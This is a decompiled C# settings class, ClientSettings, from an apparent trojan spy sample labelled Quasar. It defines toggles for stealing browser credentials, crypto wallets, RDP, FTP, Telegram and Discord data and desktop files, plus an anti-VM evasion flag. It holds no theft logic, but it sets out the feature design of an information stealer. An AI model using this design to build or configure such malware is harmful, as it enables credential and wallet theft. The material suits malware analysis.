// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.ClientSettings
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Common;
using ProtoBuf;
using System.ComponentModel;

namespace NoiseMe.Drags.App.Models
{
  [ProtoContract(Name = "ClientSettings")]
  public class ClientSettings : INotifyPropertyChanged
  {
    private bool _grabBrowserCredentials;
    private bool _grabColdWallets;
    private bool _grabRdp;
    private bool _grabFtp;
    private bool _grabDesktopFiles;
    private bool _grabTelegram;
    private bool _grabDiscord;
    private bool _antiVM;
    private BindingList<RemoteTask> _tasks;
    private BindingList<string> _desktopExtensions;

    [ProtoMember(1, Name = "GrabBrowserCredentials")]
    public bool GrabBrowserCredentials
    {
      get => this._grabBrowserCredentials;
      set
      {
        this._grabBrowserCredentials = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabBrowserCredentials)));
      }
    }

    [ProtoMember(2, Name = "GrabColdWallets")]
    public bool GrabColdWallets
    {
      get => this._grabColdWallets;
      set
      {
        this._grabColdWallets = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabColdWallets)));
      }
    }

    [ProtoMember(3, Name = "GrabRdp")]
    public bool GrabRdp
    {
      get => this._grabRdp;
      set
      {
        this._grabRdp = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabRdp)));
      }
    }

    [ProtoMember(4, Name = "GrabFtp")]
    public bool GrabFtp
    {
      get => this._grabFtp;
      set
      {
        this._grabFtp = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabFtp)));
      }
    }

    [ProtoMember(5, Name = "GrabDesktopFiles")]
    public bool GrabDesktopFiles
    {
      get => this._grabDesktopFiles;
      set
      {
        this._grabDesktopFiles = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabDesktopFiles)));
      }
    }

    [ProtoMember(6, Name = "DesktopExtensions")]
    public BindingList<string> DesktopExtensions
    {
      get => this._desktopExtensions;
      set
      {
        this._desktopExtensions = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (DesktopExtensions)));
      }
    }

    [ProtoMember(7, Name = "GrabTelegram")]
    public bool GrabTelegram
    {
      get => this._grabTelegram;
      set
      {
        this._grabTelegram = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabTelegram)));
      }
    }

    [ProtoMember(8, Name = "GrabDiscord")]
    public bool GrabDiscord
    {
      get => this._grabDiscord;
      set
      {
        this._grabDiscord = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (GrabDiscord)));
      }
    }

    [ProtoMember(10, Name = "AntiVM")]
    public bool AntiVM
    {
      get => this._antiVM;
      set
      {
        this._antiVM = value;
        PropertyChangedEventHandler propertyChanged = this.PropertyChanged;
        if (propertyChanged == null)
          return;
        propertyChanged((object) this, new PropertyChangedEventArgs(nameof (AntiVM)));
      }
    }

    public event PropertyChangedEventHandler PropertyChanged;
  }
}
